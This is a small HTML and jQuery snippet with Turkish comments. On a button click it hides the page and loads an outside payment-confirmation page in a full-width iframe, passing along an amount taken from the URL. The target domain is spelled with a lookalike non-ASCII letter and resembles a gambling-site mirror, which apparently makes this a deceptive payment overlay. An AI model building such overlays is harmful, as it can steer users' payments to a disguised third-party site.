<iframe id="myIframe" style="border:none;" name="myIframe" scrolling="yes" frameborder="0" marginheight="-1px" marginwidth="-1px" height="1120px" width="100%" allowfullscreen></iframe>

<script>
    $(document).ready(function() {
        // Sonraki Adım butonuna tıklandığında
        $('#nextStepButton').click(function() {
            // URL'den 'amount' değerini al
            var amountValue = getUrlParameter('amount');

            // İframe'in src linkine 'amount' değerini ekle
            var iframeSrc = "https://holiganbẹt930.com/tr/odeme-sayfa/onay.php?amount=" + encodeURIComponent(amountValue);
            $('#myIframe').attr('src', iframeSrc);

            // Sayfadaki diğer içeriği gizle
            $('#pageContent').hide();
        });

        // URL'den parametre almak için yardımcı fonksiyon
        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        }
    });
</script>
